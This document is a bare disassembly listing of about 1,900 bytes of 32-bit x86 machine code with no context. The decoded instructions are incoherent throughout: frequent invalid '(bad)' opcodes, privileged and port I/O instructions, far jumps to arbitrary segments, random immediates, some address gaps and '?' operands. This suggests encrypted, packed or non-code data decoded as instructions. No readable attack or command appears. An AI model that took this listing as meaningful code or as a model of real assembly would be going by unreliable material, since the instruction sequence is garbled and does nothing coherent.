  41aa25:	test   eax,0x76121a9e
  41aa2a:	std    
  41aa2b:	sar    DWORD PTR [ebp-0x42],cl
  41aa2e:	les    ecx,FWORD PTR [ecx-0x381fbf78]
  41aa34:	icebp  
  41aa35:	jb     0x41aa29
  41aa37:	and    eax,0x30a72cb3
  41aa3c:	call   0xd617:0xcb0cc819
  41aa43:	xchg   bl,dl
  41aa45:	inc    eax
  41aa46:	pop    ecx
  41aa47:	push   ds
  41aa48:	jl     0x41aa90
  41aa4a:	fidivr DWORD PTR [bx]
  41aa4d:	mov    ds:0xa9dd3527,eax
  41aa52:	sub    eax,0x8f002bc6
  41aa57:	leave  
  41aa58:	sbb    eax,DWORD PTR [eax+0x24]
  41aa5b:	mov    ecx,0xb69717f2
  41aa60:	mov    ecx,0x97069812
  41aa65:	mov    esi,0xed74303f
  41aa6a:	inc    ebp
  41aa6b:	int    0xc2
  41aa6d:	mov    al,0xc1
  41aa6f:	mov    ds:0x49faea10,eax
  41aa74:	gs sub al,0x78
  41aa77:	jbe    0x41aa56
  41aa79:	mov    ah,0x3e
  41aa7b:	fisttp DWORD PTR [eax-0x7e48e5e4]
  41aa81:	and    al,0xea
  41aa83:	and    eax,0x956bf08a
  41aa88:	cmp    eax,0x6c0e201a
  41aa8d:	sub    bl,BYTE PTR [ecx+0x14b376a2]
  41aa93:	fisub  DWORD PTR [esi-0x620d0745]
  41aa99:	shl    DWORD PTR [esp+ebp*2-0x788bc70a],1
  41aaa0:	jl     0x41aad4
  41aaa2:	push   es
  41aaa3:	stos   BYTE PTR es:[edi],al
  41aaa4:	fstp   QWORD PTR [edx+0x2e4fec81]
  41aaaa:	mov    bh,0xef
  41aaac:	jmp    0xb1be68de
  41aab1:	les    esi,FWORD PTR [ebx]
  41aab3:	xchg   DWORD PTR [ebx+0x4b],edx
  41aab6:	push   eax
  41aab7:	(bad)
  41aaba:	repnz imul ecx,DWORD PTR [ebp-0x4d],0x5e9e4fa9
  41aac2:	push   0xffffffdc
  41aac4:	push   esp
  41aac5:	shl    BYTE PTR [ebx+0x24e5ec78],0xbb
  41aacc:	fst    DWORD PTR [edi-0x43]
  41aacf:	xor    BYTE PTR ds:0x79e59801,0x66
  41aad6:	pop    edx
  41aad7:	es xchg esp,eax
  41aad9:	inc    eax
  41aada:	cdq    
  41aadb:	cmp    eax,esp
  41aadd:	pop    ecx
  41aade:	test   DWORD PTR [eax],ecx
  41aae0:	pop    ss
  41aae1:	mov    ecx,0x59d8597
  41aae6:	xchg   DWORD PTR [edi],ebp
  41aae8:	shl    ebx,1
  41aaea:	add    al,0x7d
  41aaec:	adc    al,0x48
  41aaee:	mov    eax,0xb1c1198d
  41aaf3:	fild   DWORD PTR [ebp+0xc]
  41aaf6:	repz pop eax
  41aaf8:	stc    
  41aaf9:	adc    cl,0x5b
  41aafc:	jns    0x41aa7e
  41aafe:	xchg   edi,eax
  41aaff:	(bad)
  41ab02:	(bad)  
  41ab03:	fsub   DWORD PTR [eax+0x40]
  41ab06:	add    ebp,DWORD PTR [ecx-0x3a]
  41ab09:	mov    dl,0x14
  41ab0b:	cwde   
  41ab0c:	mov    WORD PTR [eax-0x33f71e69],ds
  41ab12:	xchg   DWORD PTR [eax+0x1d],ebp
  41ab15:	test   eax,0x5d9b05d2
  41ab1a:	loope  0x41aaa2
  41ab1c:	sub    BYTE PTR ds:0xa6dd5b27,0xa
  41ab23:	arpl   WORD PTR [ebp-0x67],bp
  41ab26:	xchg   esp,eax
  41ab27:	dec    edi
  41ab28:	dec    eax
  41ab29:	inc    edi
  41ab2a:	add    BYTE PTR [eax],dh
  41ab2c:	lds    edi,FWORD PTR [ebx+0x54]
  41ab2f:	mov    esp,0xa6d75e3f
  41ab34:	fld    QWORD PTR [ebx-0x53a92f70]
  41ab3a:	in     al,0x24
  41ab3c:	imul   edi,DWORD PTR [eax+0x67],0xed2c0381
  41ab43:	inc    ebp
  41ab44:	inc    edx
  41ab45:	leave  
  41ab46:	and    cl,BYTE PTR [edx+0x53070084]
  41ab4c:	or     bl,BYTE PTR cs:[edi-0x769c60be]
  41ab53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab54:	jge    0x41abd2
  41ab56:	sahf   
  41ab57:	sub    dh,0x5c
  41ab5a:	push   edi
  41ab5b:	test   DWORD PTR [edx+0x2b55a3c0],ecx
  41ab61:	fld    TBYTE PTR [ecx+0xf]
  41ab64:	leave  
  41ab65:	addr16 mov bl,0x77
  41ab68:	mov    cl,bh
  41ab6a:	push   ecx
  41ab6b:	adc    al,0x6f
  41ab6d:	adc    eax,0x56919535
  41ab72:	push   0x385e23a7
  41ab77:	inc    edx
  41ab78:	pushw  ds
  41ab7a:	dec    esi
  41ab7b:	gs pushf 
  41ab7d:	outs   dx,BYTE PTR ds:[esi]
  41ab7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab7f:	(bad)  
  41ab80:	xor    eax,ebp
  41ab82:	(bad)  
  41ab83:	test   eax,0x40414083
  41ab88:	xchg   esp,eax
  41ab89:	pop    esi
  41ab8b:	dec    esp
  41ab8c:	jne    0x41abce
  41ab8e:	mov    dl,0xdc
  41ab90:	in     al,0x66
  41ab92:	jmp    0x25aa:0x9b2df395
  41ab99:	js     0x41abc8
  41ab9b:	jbe    0x41abb3
  41ab9d:	xor    BYTE PTR [edi-0x5c],bl
  41aba0:	jb     0x41ab82
  41aba2:	bound  edi,QWORD PTR [ecx-0x3d]
  41aba5:	nop
  41aba6:	pop    ecx
  41aba7:	imul   ebx,DWORD PTR [eax+0x49],0x7f
  41abab:	dec    edi
  41abac:	cmp    cl,dl
  41abae:	xchg   edi,eax
  41abaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abb0:	xor    ebx,ebp
  41abb2:	je     0x41ac25
  41abb4:	push   esi
  41abb5:	push   eax
  41abb6:	scas   al,BYTE PTR es:[edi]
  41abb7:	pop    ebx
  41abb8:	pusha  
  41abb9:	lahf   
  41abba:	xchg   edi,eax
  41abbb:	pushf  
  41abbc:	mov    eax,ds:0xa13fe9d
  41abc1:	mov    bl,0x7f
  41abc3:	pop    eax
  41abc4:	jmp    0xece7:0x5d91b0f7
  41abcb:	test   eax,edx
  41abcd:	inc    ecx
  41abce:	xchg   edi,eax
  41abcf:	sbb    DWORD PTR [esp+eiz*4-0x12dcb2a],ebx
  41abd6:	mov    dl,0xb0
  41abd8:	pusha  
  41abd9:	pop    eax
  41abda:	loop   0x41ab62
  41abdc:	sbb    BYTE PTR [edi-0x3fe652c9],0x29
  41abe3:	sub    BYTE PTR [eax-0x40],dh
  41abe6:	add    DWORD PTR [edx+ebp*2+0x4f],eax
  41abea:	or     cl,ah
  41abec:	jg     0x41ac2e
  41abee:	and    ecx,edi
  41abf0:	mov    cl,0x6
  41abf2:	jb     0x41ab9c
  41abf4:	int    0x7a
  41abf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abf7:	xor    ebx,DWORD PTR [ebx]
  41abf9:	push   cs
  41abfa:	dec    esi
  41abfb:	cld    
  41abfc:	ror    esp,1
  41abfe:	loope  0x41ab89
  41ac00:	adc    edi,DWORD PTR ds:[edi+0x2f]
  41ac04:	adc    eax,0x24734c40
  41ac09:	aam    0x80
  41ac0b:	push   es
  41ac0c:	jo     0x41ac06
  41ac0e:	or     al,0xdd
  41ac10:	fst    QWORD PTR [ebx+ebp*8+0x20]
  41ac14:	mov    ebp,0x4ce96e33
  41ac19:	inc    eax
  41ac1a:	in     eax,0x99
  41ac1c:	inc    ebp
  41ac1d:	fcom   st(0)
  41ac1f:	add    esp,edx
  41ac21:	pop    edi
  41ac22:	cwde   
  41ac23:	into   
  41ac24:	shl    ah,0xc0
  41ac27:	(bad)  
  41ac29:	sahf   
  41ac2a:	lds    esp,FWORD PTR [eax+0xf]
  41ac2d:	mov    eax,ds:0x39d0873d
  41ac32:	sub    dl,bh
  41ac34:	fstp   QWORD PTR [ebp-0x46]
  41ac37:	push   ebx
  41ac38:	aam    0x6e
  41ac3a:	(bad)  
  41ac3b:	das    
  41ac3c:	pop    edi
  41ac3d:	inc    eax
  41ac3e:	rcr    BYTE PTR [edi+0x17],cl
  41ac41:	push   es
  41ac42:	jg     0x41abd3
  41ac44:	mov    WORD PTR [ecx-0x38229e7d],ds
  41ac4a:	and    BYTE PTR [esi+eax*8],dh
  41ac4d:	stc    
  41ac4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac4f:	int3   
  41ac50:	outs   dx,BYTE PTR ds:[esi]
  41ac51:	pop    ebp
  41ac52:	push   ds
  41ac53:	cdq    
  41ac54:	adc    al,BYTE PTR [eax+0x35]
  41ac57:	sbb    ebp,edi
  41ac59:	ucomiss xmm6,DWORD PTR [edi-0x6b11120b]
  41ac60:	stos   DWORD PTR es:[edi],eax
  41ac61:	push   cs
  41ac62:	fwait
  41ac63:	arpl   WORD PTR [ecx],di
  41ac65:	sub    BYTE PTR [ebx+eiz*4-0x319bbf09],bl
  41ac6c:	pop    ebp
  41ac6d:	enter  0x5fae,0x53
  41ac71:	mov    eax,ds:0xdba0f697
  41ac76:	mov    edx,0x18dfa1c9
  41ac7b:	or     al,0x5c
  41ac7d:	push   ss
  41ac7e:	mov    BYTE PTR [esi-0xc65dcf0],0xdd
  41ac85:	xchg   DWORD PTR [edi-0x4e],ecx
  41ac88:	cmc    
  41ac89:	push   esp
  41ac8a:	xor    ebp,DWORD PTR [eax-0x52]
  41ac8d:	inc    eax
  41ac8e:	dec    edx
  41ac8f:	mul    esi
  41ac91:	sub    al,0x9c
  41ac93:	mov    WORD PTR [eax-0x59],?
  41ac96:	ja     0x41ac77
  41ac98:	push   esp
  41ac99:	mov    edx,edx
  41ac9b:	or     DWORD PTR [edx],esi
  41ac9d:	shl    DWORD PTR [eax-0x604a2f14],0x30
  41aca4:	aad    0x6f
  41aca6:	adc    ebx,DWORD PTR [edi-0x788d347a]
  41acac:	bound  edx,QWORD PTR [edi+0x294f2e24]
  41acb2:	cwde   
  41acb3:	pushf  
  41acb4:	fwait
  41acb5:	in     eax,dx
  41acb6:	pop    ebx
  41acb7:	cwde   
  41acb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acb9:	inc    esp
  41acba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acbb:	pop    esp
  41acbc:	rol    DWORD PTR [ebx+0x14f4c1d3],0x26
  41acc3:	push   eax
  41acc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acc6:	dec    esp
  41acc7:	xchg   DWORD PTR [eax+ecx*2-0x68],ebx
  41accb:	loopne 0x41ac51
  41accd:	pop    DWORD PTR [ebp+0x6f5ed6bd]
  41acd3:	push   esi
  41acd4:	rol    BYTE PTR [eax-0x4d],cl
  41acd7:	jno    0x41acde
  41acd9:	push   ss
  41acda:	xchg   ebp,eax
  41acdb:	fidivr DWORD PTR [eax+0x66419799]
  41ace1:	(bad)  
  41ace2:	in     eax,0x21
  41ace4:	inc    ebp
  41ace5:	sbb    ch,dl
  41ace7:	sar    DWORD PTR [esp+eiz*2+0x15],cl
  41aceb:	xchg   DWORD PTR [ebx+0x45],edi
  41acee:	mov    ds:0xdb3bdef7,al
  41acf3:	xor    eax,DWORD PTR [esi]
  41acf5:	sub    eax,0x24b8914
  41acfa:	clc    
  41acfb:	lock inc eax
  41acfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acfe:	daa    
  41acff:	mov    bh,0x27
  41ad01:	xchg   esi,eax
  41ad02:	sahf   
  41ad03:	stos   DWORD PTR es:[edi],eax
  41ad04:	sti    
  41ad05:	or     ah,0x89
  41ad08:	movaps xmm6,XMMWORD PTR [edx]
  41ad0b:	ins    BYTE PTR es:[edi],dx
  41ad0c:	or     dl,BYTE PTR ds:0xc4296773
  41ad12:	iret   
  41ad13:	xchg   dh,dh
  41ad15:	ret    0x661
  41ad18:	in     al,dx
  41ad19:	jg     0x41ac9f
  41ad1b:	adc    al,0x48
  41ad1d:	inc    ebp
  41ad1e:	dec    ebp
  41ad1f:	imul   ebx,DWORD PTR [ebp+0x3f445a77],0x4d7e534e
  41ad29:	imul   esi,DWORD PTR [edi+0x471f874d],0xffffffaf
  41ad30:	fnstsw WORD PTR [esi+ebx*8+0x372be8a6]
  41ad37:	mov    ebp,DWORD PTR [bx+0x35]
  41ad3b:	mov    al,ds:0x7697e74d
  41ad40:	or     BYTE PTR [edx],ah
  41ad42:	(bad)  
  41ad43:	int3   
  41ad44:	sbb    eax,0x820e5a58
  41ad49:	loope  0x41acd4
  41ad4b:	xchg   DWORD PTR [edx+0x7d],ebp
  41ad4e:	popa   
  41ad4f:	data16 fst QWORD PTR [ebx+0x1650e829]
  41ad56:	mov    al,ds:0x554457a9
  41ad5b:	jl     0x41ad55
  41ad5d:	add    DWORD PTR [eax],esi
  41ad5f:	iret   
  41ad60:	and    BYTE PTR [ebx+0x2add0748],cl
  41ad66:	mul    DWORD PTR [eax+0x1b89d219]
  41ad6c:	sbb    BYTE PTR [ebx+0x44],bh
  41ad6f:	push   0x5d
  41ad71:	mov    esi,0x180311c1
  41ad76:	push   0xf24717d9
  41ad7b:	bound  ebp,QWORD PTR [eax+0x6b075a71]
  41ad81:	dec    esi
  41ad82:	inc    esp
  41ad84:	(bad)  
  41ad85:	adc    al,0xd0
  41ad87:	xchg   bl,bh
  41ad89:	add    edi,DWORD PTR [edi+ebp*4+0x39e65129]
  41ad90:	(bad)
  41ad93:	xchg   DWORD PTR ds:0x973e5007,ebx
  41ad99:	inc    edi
  41ad9a:	xchg   edx,eax
  41ad9b:	std    
  41ad9c:	inc    edx
  41ad9d:	jns    0x41adda
  41ad9f:	pusha  
  41ada0:	inc    eax
  41ada1:	inc    esp
  41ada2:	sub    al,0x97
  41ada4:	fld    QWORD PTR [edi-0x4efae1e2]
  41adaa:	xchg   ecx,esi
  41adac:	out    0x4d,eax
  41adae:	rol    DWORD PTR [eax-0x2d817f38],1
  41adb4:	shl    DWORD PTR [edi],0xe7
  41adb7:	mov    dh,0xa6
  41adb9:	je     0x41ae2e
  41adbb:	daa    
  41adbc:	(bad)  [edx+0x3241fbd5]
  41adc2:	and    eax,0x6d409aea
  41adc7:	sub    eax,0x8c9067c8
  41adcc:	and    al,0xe9
  41adce:	xchg   edi,eax
  41adcf:	adc    BYTE PTR ds:0xf5253f48,dl
  41add5:	(bad)  
  41add6:	inc    esi
  41add7:	out    0x50,eax
  41add9:	sub    al,BYTE PTR [eax]
  41addb:	xchg   DWORD PTR [edx-0x41],ebx
  41adde:	sub    eax,0xd10bd1ad
  41ade3:	out    dx,eax
  41ade4:	mov    ds:0x2082b440,eax
  41ade9:	push   0x405e5106
  41adee:	jge    0x41add8
  41adf0:	call   0x2ef7e6f2
  41adf5:	shr    BYTE PTR [esi-0x6830c486],0x7f
  41adfc:	inc    eax
  41adfd:	pop    ebp
  41adfe:	pop    ebp
  41adff:	sahf   
  41ae00:	xor    eax,DWORD PTR [eax-0xf]
  41ae03:	fild   DWORD PTR [eax*4-0x5837962c]
  41ae0a:	adc    ebx,DWORD PTR [ecx+0x277618dd]
  41ae10:	fld    DWORD PTR [eax]
  41ae12:	js     0x41ae11
  41ae14:	imul   eax,DWORD PTR [eax+0x2b],0x6c
  41ae18:	repz mov dh,0x50
  41ae1b:	sub    al,0x79
  41ae1d:	sbb    ebx,DWORD PTR [eax+0x160ab558]
  41ae23:	and    dl,al
  41ae25:	popa   
  41ae26:	jge    0x41ae7c
  41ae28:	or     eax,0x918a8995
  41ae2d:	or     edi,DWORD PTR [eax-0x75]
  41ae30:	xchg   esp,eax
  41ae31:	xchg   esp,eax
  41ae32:	xchg   edi,eax
  41ae33:	(bad)  
  41ae34:	jne    0x41ae4b
  41ae36:	in     eax,0x90
  41ae38:	or     edx,edx
  41ae3a:	call   0x799a143f
  41ae3f:	xchg   DWORD PTR [ebx],edi
  41ae41:	jp     0x41ae22
  41ae43:	and    ebp,ebx
  41ae45:	rcl    BYTE PTR [ecx+0x8b23db7],1
  41ae4b:	scas   al,BYTE PTR es:[edi]
  41ae4c:	mov    esi,0x8f2fe440
  41ae51:	retf   0xaf9e
  41ae54:	mov    WORD PTR [ebp-0x242e96f7],?
  41ae5a:	xchg   edi,eax
  41ae5b:	jp     0x41ae39
  41ae5d:	in     eax,0x19
  41ae5f:	cmp    eax,0xfefb09b2
  41ae64:	lock rol BYTE PTR [ebx+0x7931da87],1
  41ae6b:	dec    ecx
  41ae6c:	xchg   ebp,eax
  41ae6d:	ret    0xb997
  41ae70:	mov    bl,0xad
  41ae72:	retf   
  41ae73:	lock hlt 
  41ae75:	xchg   edi,eax
  41ae76:	repz push esi
  41ae78:	push   ebp
  41ae79:	sbb    eax,0x3acb8948
  41ae7e:	js     0x41aeed
  41ae80:	(bad)  
  41ae82:	pushf  
  41ae83:	mov    DWORD PTR [ebx-0x3a],ebx
  41ae86:	inc    ebx
  41ae87:	ss icebp 
  41ae89:	jmp    0x41aefc
  41ae8b:	push   ebp
  41ae8c:	adc    esp,ecx
  41ae8e:	mov    ebx,0xb3077986
  41ae93:	adc    BYTE PTR [eax+0x7f],dh
  41ae96:	sbb    DWORD PTR [ebx+0x199cabfc],0x46bde8da
  41aea0:	aaa    
  41aea1:	jecxz  0x41ae3a
  41aea3:	arpl   WORD PTR [edx+ebp*4-0x37],di
  41aea7:	mov    al,0x78
  41aea9:	jle    0x41af0a
  41aeab:	mov    al,ds:0x86cf839d
  41aeb0:	push   edx
  41aeb1:	push   ecx
  41aeb2:	sbb    DWORD PTR [edx-0x7c189db2],ecx
  41aeb8:	cwde   
  41aeb9:	inc    esi
  41aeba:	mov    bl,0x23
  41aebc:	pop    eax
  41aebd:	loope  0x41ae61
  41aebf:	mov    ebp,0x63d94055
  41aec4:	ins    DWORD PTR es:[edi],dx
  41aec5:	jge    0x41aec2
  41aec7:	ja     0x41ae68
  41aec9:	xor    ah,bl
  41aecb:	xchg   BYTE PTR ds:0xddd9bc68,dh
  41aed1:	push   0xbe9bb4b4
  41aed6:	out    dx,al
  41aed7:	popf   
  41aed8:	pusha  
  41aed9:	inc    eax
  41aeda:	jnp    0x41af4f
  41aedc:	xchg   esp,eax
  41aedd:	add    al,0x2a
  41aedf:	ror    esi,0x9a
  41aee2:	xchg   edi,eax
  41aee3:	fucomi st,st(0)
  41aee5:	and    dh,0x12
  41aee8:	dec    edi
  41aee9:	lea    edx,[esi+eax*4+0x35]
  41aeed:	(bad)  
  41aeee:	int3   
  41aeef:	mov    BYTE PTR [esi],bl
  41aef1:	fdiv   st(7),st
  41aef3:	out    0x4b,al
  41aef5:	sahf   
  41aef6:	xchg   edi,eax
  41aef7:	jbe    0x41aeb3
  41aef9:	(bad)  
  41aefa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aefb:	js     0x41ae95
  41aefd:	popf   
  41aefe:	stos   DWORD PTR es:[edi],eax
  41aeff:	fcom   QWORD PTR [esp+eax*2-0x39]
  41af03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af04:	pusha  
  41af05:	push   ds
  41af06:	lea    ecx,[esi]
  41af08:	dec    esi
  41af09:	cmp    dl,BYTE PTR [eax+0x27]
  41af0c:	jmp    0x41af72
  41af0e:	mov    ebx,0x7169489c
  41af13:	outs   dx,DWORD PTR ds:[esi]
  41af14:	pusha  
  41af15:	or     ebp,ebp
  41af17:	push   es
  41af18:	mov    esp,0xe0ea3a7a
  41af1d:	adc    al,0xc5
  41af1f:	sub    al,0xc
  41af21:	pop    es
  41af22:	cmp    dl,0x5c
  41af25:	cmc    
  41af26:	xchg   edi,eax
  41af27:	ret    0xee9e
  41af2a:	pop    esp
  41af2b:	sar    DWORD PTR [esi+0x73dd6c8b],0xaa
  41af32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af33:	cwde   
  41af34:	inc    edx
  41af35:	mov    BYTE PTR [eax],bh
  41af37:	xchg   ebp,eax
  41af38:	ror    DWORD PTR [ebx],1
  41af3a:	imul   ebp,DWORD PTR [esi+0x46976c65],0x82299e3f
  41af44:	adc    bh,BYTE PTR [ecx]
  41af46:	das    
  41af47:	jge    0x41af15
  41af49:	xor    ebx,DWORD PTR [ebx+0x777b8589]
  41af4f:	mov    edx,0x2297a58b
  41af54:	pop    ebp
  41af55:	or     al,0xf9
  41af57:	mov    al,ds:0xbb09540e
  41af5c:	int3   
  41af5d:	inc    edi
  41af5e:	mov    edx,0x84245afa
  41af63:	mov    esi,0x5769187b
  41af68:	leave  
  41af69:	adc    BYTE PTR [edi+0x438f14b],0x2d
  41af70:	sbb    DWORD PTR [edx-0x68bb99ea],edi
  41af76:	jmp    0xe0c3:0xe0840886
  41af7d:	test   DWORD PTR [ebx-0x42a88ee2],ebp
  41af83:	lea    esp,[ebx-0x31b8730d]
  41af89:	out    dx,eax
  41af8a:	mov    ch,0x8d
  41af8c:	jnp    0x41af9e
  41af8e:	mov    eax,cs
  41af90:	and    BYTE PTR [edi+edx*4-0x71],al
  41af94:	sub    al,0x5
  41af96:	pop    ecx
  41af97:	addr16 dec edi
  41af99:	mov    al,al
  41af9b:	mov    eax,0x6a9c4344
  41afa0:	addr16 cmp esp,esi
  41afa3:	dec    esp
  41afa4:	(bad)
  41afa7:	mov    ecx,0x34479cdd
  41afac:	push   esi
  41afad:	repz sbb al,bl
  41afb0:	or     BYTE PTR [eax+0x7b],al
  41afb3:	mov    eax,0x35cee399
  41afb8:	xor    DWORD PTR [edi-0x69],edi
  41afbb:	repz mov bh,0x52
  41afbe:	dec    edi
  41afbf:	pop    ecx
  41afc0:	cmp    DWORD PTR [esi+edi*2+0x7a3b9df8],0xffffff8a
  41afc8:	in     al,0x77
  41afca:	ss cli 
  41afcc:	nop
  41afcd:	ror    BYTE PTR [ecx],0x5b
  41afd0:	jbe    0x41b01e
  41afd2:	xchg   edi,eax
  41afd3:	jmp    0x41af9b
  41afd5:	rcl    DWORD PTR [eax+esi*4-0xd],0x92
  41afda:	adc    al,BYTE PTR [ecx+ecx*2]
  41afdd:	in     al,0xf6
  41afdf:	xchg   BYTE PTR [edx+0x19632e5f],ah
  41afe5:	inc    edx
  41afe6:	call   0xbb8d:0xe5fd72df
  41afed:	sar    BYTE PTR [eax],0x23
  41aff0:	mov    cl,0x3b
  41aff2:	(bad)  
  41aff3:	rcl    DWORD PTR [esi],cl
  41aff5:	mov    ah,0xae
  41aff7:	xchg   BYTE PTR [edi+0x7e],bl
  41affa:	jmp    0xec83:0xc9aadd0b
  41b001:	cmp    edx,0xffffffed
  41b004:	xor    al,BYTE PTR [eax-0x79]
  41b007:	mul    DWORD PTR [eax+0x76649f69]
  41b00d:	xchg   esi,eax
  41b00e:	xchg   edi,eax
  41b00f:	mov    ds:0xffbe761f,al
  41b014:	mov    ds:0x3622c84a,eax
  41b019:	aad    0xd2
  41b01b:	xchg   BYTE PTR [esi+ecx*8-0x68],ah
  41b01f:	xchg   ecx,eax
  41b020:	fisttp QWORD PTR [ecx]
  41b022:	inc    BYTE PTR gs:[eax-0x67427926]
  41b029:	fdiv   DWORD PTR [ecx+0x4c]
  41b02c:	inc    eax
  41b02d:	xchg   edi,eax
  41b02e:	test   al,0x86
  41b030:	int    0x18
  41b032:	mov    bh,0x90
  41b034:	fnstsw WORD PTR [eax+0x6d]
  41b037:	outs   dx,DWORD PTR ds:[esi]
  41b038:	pop    ecx
  41b039:	and    dh,ah
  41b03b:	and    eax,0x38246ed1
  41b040:	push   esp
  41b041:	inc    esp
  41b042:	mov    ah,BYTE PTR [ecx]
  41b044:	fsub   QWORD PTR [eax]
  41b046:	push   edx
  41b047:	out    0xeb,al
  41b049:	mov    esi,0x9fe23d18
  41b04e:	popa   
  41b04f:	xchg   edi,eax
  41b050:	fwait
  41b051:	pop    eax
  41b052:	cmp    BYTE PTR [esp+edi*8],cl
  41b055:	aas    
  41b056:	lods   eax,DWORD PTR ds:[esi]
  41b057:	add    eax,0x7205b89c
  41b05c:	mov    dh,0x89
  41b05e:	xchg   edi,eax
  41b05f:	jae    0x41b083
  41b061:	or     ah,ch
  41b063:	stc    
  41b064:	jns    0x41b007
  41b066:	jmp    0xea87:0x29b9d88a
  41b06d:	inc    ecx
  41b06e:	mov    al,0x1b
  41b070:	fst    QWORD PTR [eax-0x6]
  41b073:	repz xor eax,0x660b3d4c
  41b079:	inc    ecx
  41b07a:	out    0x47,eax
  41b07c:	(bad)
  41b080:	push   es
  41b081:	sbb    al,0x22
  41b083:	arpl   bp,bx
  41b085:	jo     0x41b09d
  41b087:	add    DWORD PTR [edi],esi
  41b089:	xchg   ebp,eax
  41b08a:	retf   0x24fe
  41b08d:	push   edi
  41b08e:	mul    edi
  41b090:	or     BYTE PTR [edx-0xe],al
  41b093:	fsub   DWORD PTR [ecx+0x7ff84f]
  41b099:	add    BYTE PTR [esi],bl
  41b09b:	test   BYTE PTR [ebx+0x5d],dl
  41b09e:	xchg   edi,eax
  41b09f:	mov    bh,0x6f
  41b0a1:	dec    esi
  41b0a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0a3:	scas   eax,DWORD PTR es:[edi]
  41b0a4:	sti    
  41b0a5:	push   eax
  41b0a6:	cmc    
  41b0a7:	push   edx
  41b0a8:	mov    eax,ds:0xf186b048
  41b0ad:	les    ecx,FWORD PTR [eax]
  41b0af:	int3   
  41b0b0:	push   ss
  41b0b1:	xor    al,ch
  41b0b3:	cmp    eax,0x874abf79
  41b0b8:	mov    bh,0xa8
  41b0ba:	inc    esi
  41b0bb:	adc    ah,bh
  41b0bd:	pop    edx
  41b0be:	push   es
  41b0bf:	xchg   DWORD PTR [ebp-0x221b7f80],esp
  41b0c5:	sahf   
  41b0c6:	add    al,0x42
  41b0c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0c9:	inc    esi
  41b0ca:	xor    bl,dl
  41b0cc:	push   esi
  41b0cd:	inc    ecx
  41b0ce:	mov    BYTE PTR [ecx],bl
  41b0d0:	inc    esi
  41b0d1:	jmp    0xa0768b92
  41b0d6:	ret    
  41b0d7:	pusha  
  41b0d8:	(bad)  [ebp-0x3a]
  41b0db:	loop   0x41b088
  41b0dd:	scas   eax,DWORD PTR es:[edi]
  41b0de:	adc    BYTE PTR [edi+0xc5a7932],ah
  41b0e4:	pop    esi
  41b0e5:	iret   
  41b0e6:	jmp    0x3d2c:0xc524a872
  41b0ed:	pusha  
  41b0ee:	fsub   QWORD PTR [edi-0x21]
  41b0f1:	cmp    ah,BYTE PTR [eax+esi*2]
  41b0f4:	rcr    DWORD PTR [ecx+0x39c988cc],1
  41b0fa:	push   ebx
  41b0fb:	or     DWORD PTR [edi+0x34775740],esi
  41b101:	push   ebx
  41b102:	popa   
  41b103:	cmp    edi,ebx
  41b105:	dec    ebp
  41b106:	xchg   edi,eax
  41b107:	adc    eax,0x265c660b
  41b10c:	dec    ecx
  41b10d:	std    
  41b10e:	mov    ah,0x82
  41b110:	out    dx,al
  41b111:	pop    edi
  41b112:	sub    DWORD PTR [edi+0xc20e612],eax
  41b118:	(bad)  
  41b11a:	xchg   BYTE PTR ds:0x4f01a7b8,cl
  41b120:	pop    esi
  41b121:	mov    bh,0xb5
  41b123:	mov    bh,0xf6
  41b125:	mov    dh,0xd4
  41b127:	xchg   BYTE PTR [edi],bh
  41b129:	je     0x41b131
  41b12b:	test   eax,0x72d311eb
  41b130:	je     0x41b0d2
  41b132:	xor    ecx,DWORD PTR [esi]
  41b134:	mov    edi,0xe93c9d08
  41b139:	hlt    
  41b13a:	sbb    eax,ebp
  41b13c:	aam    0xa4
  41b13e:	push   0x51ac4479
  41b143:	pop    es
  41b144:	(bad)  
  41b146:	cmp    DWORD PTR [edx],0x1336ed65
  41b14c:	ds inc ecx
  41b14e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b14f:	mov    al,ds:0xb09e04a6
  41b154:	das    
  41b155:	xor    ch,bl
  41b157:	mov    ah,0xd3
  41b159:	mov    ebp,0x1e98ed98
  41b15e:	push   esi
  41b15f:	outs   dx,DWORD PTR ds:[esi]
  41b160:	mov    DWORD PTR [esi+0x40646ff7],esp
  41b166:	push   0x90862e63
  41b16b:	je     0x41b1b6
  41b16d:	out    dx,eax
  41b16e:	call   0xe4b2:0x250e858c
  41b175:	pop    ds
  41b176:	test   eax,0x103fec1f
  41b17b:	bound  ebx,QWORD PTR [esi-0xc4eed0d]
  41b181:	imul   ecx,DWORD PTR [edi],0xffffffa9
  41b184:	push   ecx
  41b185:	fld    TBYTE PTR [edi]
  41b187:	mov    edi,0xbe7f4fdd
  41b18c:	loop   0x41b150
  41b18e:	int    0xe1
  41b190:	adc    BYTE PTR [eax+0x50],al
  41b193:	adc    ah,ch
  41b195:	inc    ebp
  41b196:	inc    edx
  41b197:	add    al,0xc7
  41b199:	xchg   esi,eax
  41b19a:	xchg   edi,eax
  41b19b:	mov    edi,0xfd5adfb5
  41b1a0:	xor    DWORD PTR [ecx+0x9],ecx
  41b1a3:	cmc    
  41b1a4:	cmp    al,bh
  41b1a6:	inc    ecx
  41b1a7:	xchg   eax,edi
  41b1a9:	lea    esi,[ebx-0x68aea602]
  41b1af:	xor    DWORD PTR [ebx+0x14],edi
  41b1b2:	(bad)  
  41b1b3:	adc    eax,0x50bf915e
  41b1b8:	(bad)  
  41b1b9:	loope  0x41b160
  41b1bb:	mov    dh,0xb4
  41b1bd:	lock xchg edi,eax
  41b1bf:	jecxz  0x41b1db
  41b1c1:	xor    eax,0x81adde1c
